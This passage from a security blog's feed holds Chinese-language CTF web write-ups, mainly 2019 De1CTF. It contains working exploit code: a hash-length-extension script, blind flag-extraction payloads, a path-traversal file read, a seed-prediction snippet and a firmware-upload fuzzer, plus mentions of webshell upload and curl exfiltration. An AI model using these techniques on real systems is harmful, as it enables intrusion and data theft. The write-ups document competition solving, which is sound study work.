class="line">templates/upload.html</span><br></pre></td></tr></table></figure></p><p>于是读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/cwd/templates/upload.html</span><br></pre></td></tr></table></figure></p><p>得到:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                上传图片</span><br><span class="line">            &lt;<span class="regexp">/td&gt;</span></span><br><span class="line"><span class="regexp">            &lt;td&gt;</span></span><br><span class="line"><span class="regexp">                &lt;input type="file" name="file"&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">            &lt;/</span>td&gt;</span><br><span class="line">        &lt;<span class="regexp">/tr&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>table&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"上传"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&#123;% if file %&#125;</span></span><br><span class="line"><span class="regexp">    &lt;img src="img.php?name=&#123;&#123; file &#125;&#125;"&gt;</span></span><br><span class="line"><span class="regexp">&#123;% else %&#125;</span></span><br><span class="line"><span class="regexp">    请上传一张图片</span></span><br><span class="line"><span class="regexp">&#123;% endif %&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- flag in /</span>root/flag.txt ! Get it ! --&gt;</span><br></pre></td></tr></table></figure></p><p>发下flag在/root/flag.txt，进行读取：<br><img src="/images/2019-08-15-17-26-21.png" alt=""><br>即可成功getflag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天要坐5个小时的高铁，在车上顺便打了个比赛，以下是web题解。&lt;/p&gt;
&lt;h2 id=&quot;Game&quot;&gt;&lt;a href=&quot;#Game&quot; cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 De1CTF Writeup</title>
    <link href="http://skysec.top/2019/08/03/2019-De1CTF-Writeup/"/>
    <id>http://skysec.top/2019/08/03/2019-De1CTF-Writeup/</id>
    <published>2019-08-03T10:50:10.000Z</published>
    <updated>2019-09-07T01:24:46.564Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了去重庆XCTF Final吃火锅，周末就冲了一下De1CTF，以下是本次比赛Web题解。<br><img src="/images/2019-08-05-10-15-37.png" alt=""></p><h2 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h2><p>拿到题目源码如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="keyword">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></p><p>观察一下，发现就是个比较裸的SSRF:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br></pre></td></tr></table></figure></p><p>然后waf如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>同时结合题目告诉我们flag位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint for [SSRF Me]: flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p><p>那么显然只要能任意文件读取，bypass file过滤即可，这里容易想到可以使用local_file:<br><img src="/images/2019-08-04-10-15-34.png" alt=""><br>但是我们发现想要利用scan，要先bypass签名校验：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>我们跟进getSign():<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p><p>而salt我们知道:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p><p>所以这明显是一个已知salt长度的hash长度拓展攻击的问题，那么很容易写出脚本如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'local_file:flag.txt'</span></span><br><span class="line">r = requests.get(<span class="string">'http://139.180.128.86/geneSign?param='</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">'sign'</span>: new_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">'action'</span>: urllib.quote(new_sign[<span class="number">1</span>][<span class="number">19</span>:])</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://139.180.128.86/De1ta?param='</span>+url, cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-04-10-23-38.png" alt=""></p><h2 id="9calc"><a href="#9calc" class="headerlink" title="9calc"></a>9calc</h2><p>第3次calcalcalc了，不想再分析了，脚本如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># flag1 js</span></span><br><span class="line"><span class="comment"># chr(j),i,chr(j)</span></span><br><span class="line">data1 = <span class="string">r'''&#123;"expression":&#123;"value":"1//1 and '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00' or '\\\n&amp;&amp;'#' &amp;&amp; ('1e1' != '10e0' &amp;&amp; require('fs').readFileSync('/flag').toString()[%s] + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00') || eval('echo \"\\x1d\\x00\\x00\\x00\\x02ret\\x00\\x0f\\x00\\x00\\x00\".\"%s\";')\n","_bsontype":"Symbol"&#125;,"isVip":true&#125;'''</span></span><br><span class="line"><span class="comment"># flag2 python</span></span><br><span class="line"><span class="comment"># i,chr(j),chr(j)</span></span><br><span class="line">data2 = <span class="string">r'''&#123;"expression":&#123;"value":"1//1 and open('/flag').read()[%s] + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00' or '\\\n&amp;&amp;'#' &amp;&amp; ('1e1' != '10e0' &amp;&amp; '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00') || eval('echo \"\\x1d\\x00\\x00\\x00\\x02ret\\x00\\x0f\\x00\\x00\\x00\".\"%s\";')\n","_bsontype":"Symbol"&#125;,"isVip":true&#125;'''</span></span><br><span class="line"><span class="comment"># flag3 php</span></span><br><span class="line"><span class="comment"># chr(j),chr(j),i</span></span><br><span class="line">data3 = <span class="string">r'''&#123;"expression":&#123;"value":"1//1 and '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00' or '\\\n&amp;&amp;'#' &amp;&amp; ('1e1' != '10e0' &amp;&amp; '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00') || eval('echo \"\\x1d\\x00\\x00\\x00\\x02ret\\x00\\x0f\\x00\\x00\\x00\".file_get_contents(\"/flag\")[%s];')\n","_bsontype":"Symbol"&#125;,"isVip":true&#125;'''</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://45.77.242.16/calculate"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line"><span class="comment"># now_data = data1%(chr(j),i,chr(j))</span></span><br><span class="line"><span class="comment"># now_data = data2%(i,chr(j),chr(j))</span></span><br><span class="line">now_data = data3%(chr(j),chr(j),i)</span><br><span class="line">r = requests.post(url,data=now_data,headers=header)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">res+=chr(j)</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-04-10-31-49.png" alt=""><br><img src="/images/2019-08-04-10-31-27.png" alt=""><br><img src="/images/2019-08-04-10-31-33.png" alt=""><br>可以得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de1ctf&#123;i_hate_bunkatsu_soho&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ShellShellShell"><a href="#ShellShellShell" class="headerlink" title="ShellShellShell"></a>ShellShellShell</h2><p>这题有点无语，第一层是N1CTF的题，参考如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</span><br></pre></td></tr></table></figure></p><p>这题再简单说一下思路吧：<br>1.注入得到管理员密码<br>2.soapclient发起ssrf<br>3.进行CRLF头注入登录<br>4.拿到admin session<br>我们直接用上述链接中的脚本：<br>首先生成验证码映射关系：<br><img src="/images/2019-08-04-10-44-14.png" alt=""><br>然后是注入密码：<br><img src="/images/2019-08-04-10-44-19.png" alt=""><br><img src="/images/2019-08-03-18-51-05.png" alt=""><br>最后是SSRF拿到admin session：<br><img src="/images/2019-08-04-10-44-25.png" alt=""><br><img src="/images/2019-08-04-10-45-10.png" alt=""><br>然后是一个裸上传：<br><img src="/images/2019-08-04-10-45-28.png" alt=""><br>同时提醒我们flag在内网，这里的上传没任何过滤，随便传个小马即可RCE，然后上传代理，扫描内网，得到题目ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.18.0.1</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Nmap scan report for dockerdir_getshell_1.dockerdir_default (172.18.0.2)</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">Nmap scan report for 29e2e46b7ac1 (172.18.0.3)</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 1.91 seconds</span><br></pre></td></tr></table></figure></p><p>访问172.18.0.2，得到源码如下：<br><img src="/images/2019-08-04-10-46-51.png" alt=""><br>然后发现似曾相识= =：<br><img src="/images/2019-08-04-10-47-09.png" alt=""><br>那么就用这篇Blog的方式可以轻松解决:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/11/04/2018%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-web/#web3</span><br></pre></td></tr></table></figure></p><h2 id="cloudmusic-rev"><a href="#cloudmusic-rev" class="headerlink" title="cloudmusic_rev"></a>cloudmusic_rev</h2><p>看到是2.0版本，本能搜了一下，发现是2019国赛final的题目，题解如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/impakho/ciscn2019_final_web1</span><br></pre></td></tr></table></figure></p><p>按照题解思路，可以迅速拿到/lib/parser.so文件：<br><img src="/images/2019-08-04-10-49-12.png" alt=""><br>尝试读取.php的时候，发现有过滤：<br><img src="/images/2019-08-04-12-03-16.png" alt=""><br>但可以用%2e url编码进行绕过：<br><img src="/images/2019-08-04-12-03-29.png" alt=""><br>那么读取关键文件进行diff：<br>upload.php<br><img src="/images/2019-08-04-12-01-19.png" alt=""><br>利用原题解中的方式进行password leak，发现代码有改变，简单分析发现是off by null，构造：<br><img src="/images/2019-08-04-15-29-46.png" alt=""><br>即可leak password:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">22Z2teQgmmLQJLjD</span><br></pre></td></tr></table></figure></p><p>接着diff firmware.php：<br><img src="/images/2019-08-04-12-02-22.png" alt=""><br><img src="/images/2019-08-04-12-02-25.png" alt=""><br>发现在firmware中，文件名称做了改动，拼接字符串变成了remote_addr，并且在后面回显版本号的时候，去掉了回显。<br>也就是说，这道题只能盲打了:<br><img src="/images/2019-08-04-12-07-23.png" alt=""><br>不会再如上图打印执行命令结果了。<br>按照原题的思路，我们使用如下命令去getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tac /flag</span><br></pre></td></tr></table></figure></p><p>但是考虑到不能回显，于是我们构造curl带出，编写相应的文件：<br><img src="/images/2019-08-04-15-24-47.png" alt=""><br>预测文件path:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$seed = strtotime(<span class="string">"Sun, 04 Aug 2019 07:16:55 GMT"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">-50</span>;$i&lt;<span class="number">50</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">mt_srand($seed+$i);</span><br><span class="line"><span class="keyword">echo</span> md5(mt_rand().<span class="string">"202.120.234.54"</span>).<span class="string">"','"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>fuzz目录与上传:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://139.180.144.87:9090/hotload.php?page=firmware'</span></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:<span class="string">'0khipdkurln3q6a4tli9t7v38o'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">f = open(<span class="string">'exp.so'</span>,<span class="string">'rb'</span>)</span><br><span class="line">firmware = f.read()</span><br><span class="line">files = &#123;<span class="string">'file_data'</span>: firmware&#125;</span><br><span class="line">data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files,cookies=cookies)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">return</span> r.headers</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz_path</span><span class="params">(path)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'path'</span>:path</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url, data=data, cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'loading firmware'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"></span><br><span class="line">r = upload()</span><br><span class="line"><span 